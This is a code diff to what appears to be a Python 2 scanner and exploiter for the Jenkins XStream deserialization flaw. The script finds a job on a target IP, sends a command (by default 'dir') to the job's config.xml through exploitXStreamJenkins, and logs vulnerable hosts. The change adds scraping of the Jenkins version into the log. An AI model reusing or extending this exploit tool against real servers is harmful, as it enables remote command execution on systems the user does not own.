@@ -638,9 +638,10 @@ def checkXStreamJenkins(ip, cmdstr):
         try:
             result = requests.get(url,timeout=10).content
             job = getJobFromJenkins(result)
+            ver = getJenkinsVersion(result)
             if job:
                 job_url = url + job + "config.xml"
-                exploitXStreamJenkins(job_url, cmdstr)
+                exploitXStreamJenkins(job_url, cmdstr, ver)
             else:
                 print '[!] no job found! url: '+url
         except Exception,e:
@@ -648,7 +649,7 @@ def checkXStreamJenkins(ip, cmdstr):
     else:
         print '[!] connection failed! ip: '+ip
 
-def exploitXStreamJenkins(job_url, cmdstr):  
+def exploitXStreamJenkins(job_url, cmdstr, ver):  
     command = ""
     if cmdstr == "":
         command = "<string>dir</string>"
@@ -671,7 +672,7 @@ def exploitXStreamJenkins(job_url, cmdstr):
                        system = "Windows"
                    else:
                        system = "Linux/Unix"
-                   vul= "[+] vuls found! url: "+job_url+", system: "+system+", job_path: "+job_path
+                   vul= "[+] vuls found! url: "+job_url+", system: "+system+", version: "+ver+", job_path: "+job_path
                    logfile(vul,'jenkins.txt')
                    print vul
                 else:
@@ -714,6 +715,18 @@ def getJobFromJenkins(html):
 	href=html_doc.find_all('a', class_="model-link inside")[0].get('href')
         if href:
             return href
+        else:
+            return ""
+    except Exception:
+        return ""
+
+def getJenkinsVersion(html):
+    try:
+        soup = BeautifulSoup(html)
+        html_doc=soup.find('span', class_="jenkins_ver")
+	ver=html_doc.find('a').find_all(text=True)[0]
+        if ver:
+            return str(ver)
         else:
             return ""
     except Exception:
